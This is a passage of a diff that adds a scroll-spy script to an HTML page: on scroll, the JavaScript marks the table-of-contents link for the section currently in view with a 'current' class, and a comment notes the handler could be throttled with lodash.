+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
